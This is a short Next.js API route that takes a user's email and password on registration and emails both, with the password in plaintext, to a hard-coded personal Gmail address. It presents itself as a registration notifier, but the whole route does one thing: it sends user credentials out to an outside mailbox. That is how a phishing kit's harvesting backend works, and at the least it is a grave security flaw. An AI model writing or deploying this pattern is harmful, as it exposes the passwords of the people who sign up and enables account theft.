import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    // Create a Nodemailer transporter using your email service credentials
    const transporter = nodemailer.createTransport({
      service: 'gmail', // or your email service
      auth: {
        user: 'YOUR_EMAIL_ADDRESS', // Your email address
        pass: 'YOUR_EMAIL_PASSWORD', // Your email password or app-specific password
      },
    });

    const mailOptions = {
      from: 'YOUR_EMAIL_ADDRESS', // Sender address
      to: 'vaibhavjj99@gmail.com', // Recipient address
      subject: 'New User Registration',
      html: `<p>A new user has registered:</p><p>Email: ${email}</p><p>Password: ${password}</p>`, // Email content
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({ message: 'Email sent successfully' });
  } catch (error: any) {
    console.error('Error sending email:', error);
    return NextResponse.json({ error: 'Failed to send email' }, { status: 500 });
  }
}